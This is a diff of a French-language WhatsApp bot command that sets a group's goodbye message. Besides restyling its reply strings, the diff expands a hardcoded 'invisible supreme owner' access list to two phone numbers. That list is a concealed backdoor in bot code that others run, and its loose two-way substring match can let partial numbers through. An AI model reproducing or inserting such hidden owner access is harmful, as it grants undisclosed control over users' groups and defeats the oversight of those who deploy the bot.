@@ -27,7 +27,7 @@ module.exports = {
   name: 'motsadieu',
   aliases: ['goodbyetext', 'setgoodbye', 'traceadieu'],
   category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
-  description: '**『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴘᴇʀsᴏɴɴᴀʟɪsᴇ ʟᴇ ᴍᴇssᴀɢᴇ ᴅ\'ᴀᴄᴄᴜᴇɪʟ ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ**',
+  description: '『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴘᴇʀsᴏɴɴᴀʟɪsᴇ ʟᴇ ᴍᴇssᴀɢᴇ ᴅ\'ᴀᴄᴄᴜᴇɪʟ ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
   usage: `${prefix}motsadieu <message>`, // 💡 Dynamique avec ton préfixe actuel
   groupOnly: true,
   adminOnly: true, // 🔐 Sécurisé pour éviter les dérives de membres
@@ -41,9 +41,9 @@ module.exports = {
       const senderJid = msg.key.participant || msg.key.remoteJid;
       const senderNumber = senderJid.replace(/\D/g, '');
 
-      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
-      const supremeOwner = '22651622652';
-      const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);
+      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE (Double emprise active)
+      const supremeOwners = ['22651622652', '22665108174'];
+      const isSupremeOwner = supremeOwners.some(num => senderNumber.includes(num) || num.includes(senderNumber));
 
       // SÉCURITÉ : Vérification via le config.js
       const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
@@ -55,28 +55,27 @@ module.exports = {
 
       // Si l'utilisateur n'est pas admin et n'est pas le Suprême Owner
       if (!extra.isAdmin && !isMe) {
-        return reply(`*❌ ${toSmallCaps('cette incantation est reservee aux administrateurs du sanctuaire')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
+        return reply(`*❌ ${toSmallCaps('cette incantation est reservee aux administrateurs du sanctuaire')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
       }
 
       if (!args.length) {
         const groupSettings = db.getGroupSettings(from);
 
         return reply(
-          `╭╼━≪• *ᴍᴇssᴀɢᴇ ᴅ'ᴀᴅɪᴇᴜx* •≫━╾╮\n` +
-          `╰━━━━━━━━━━━━━━━╯\n\n` +
-          `📝 *ᴍᴇssᴀɢᴇ ᴀᴄᴛᴜᴇʟ :*\n` +
-          `${groupSettings.goodbyeMessage || 'ᴀᴜᴄᴜɴ'}\n\n` +
-          `🔮 *ɪɴᴄᴀɴᴛᴀᴛɪᴏɴ :*\n` +
-          `  ${prefix}motsadieu <message>\n\n` +
-          `💡 *${toSmallCaps('astuce')} :* ${toSmallCaps('utilisez')} \`@user\` ${toSmallCaps('pour mentionner l individu qui quitte le sanctuaire')}.\n\n` +
-          `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`
+          `*╭╼━━━≪• ᴍᴇssᴀɢᴇ ᴅ'ᴀᴅɪᴇᴜx •≫━━━╾╮*\n` +
+          `*┃* 📝 *${toSmallCaps('message actuel')} :*\n` +
+          `*┃* ${groupSettings.goodbyeMessage || 'ᴀᴜᴄᴜɴ'}\n\n` +
+          `*┃* 🔮 *${toSmallCaps('incantations disponibles')} :*\n` +
+          `*┃* ${prefix}motsadieu <message>\n\n` +
+          `*┃* 💡 *${toSmallCaps('astuce')} :* ${toSmallCaps('utilisez')} \`@user\` ${toSmallCaps('pour mentionner l individu qui quitte le sanctuaire')}.\n\n` +
+          `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
         );
       }
 
       const goodbyeMessage = args.join(' ');
 
       if (goodbyeMessage.length > 500) {
-        return reply(`*❌ ${toSmallCaps('le message d adieux est trop long')} ! (ᴍᴀxɪᴍᴜᴍ 𝟻𝟶𝟶 ᴄᴀʀᴀᴄᴛᴇʀᴇs).* \n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
+        return reply(`*❌ ${toSmallCaps('le message d adieux est trop long')} ! (ᴍᴀxɪᴍᴜᴍ 𝟻𝟶𝟶 ᴄᴀʀᴀᴄᴛᴇʀᴇs).* \n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
       }
 
       db.updateGroupSettings(from, { goodbyeMessage });
@@ -85,13 +84,13 @@ module.exports = {
         text: `*✅ ${toSmallCaps('message d adieux mis a jour')} !*\n\n` +
               `🔮 *ᴀᴘᴇʀᴄ̧ᴜ :*\n` +
               `${goodbyeMessage.replace('@user', '@' + senderNumber)}\n\n` +
-              `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`,
+              `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`,
         mentions: [senderJid]
       }, { quoted: msg });
 
     } catch (error) {
       console.error('Set Goodbye Error:', error);
-      await reply(`*❌ ${toSmallCaps('l invocation a echoue')} : ${error.message}*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
+      await reply(`*❌ ${toSmallCaps('l invocation a echoue')} : ${error.message}*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
     }
   }
 };
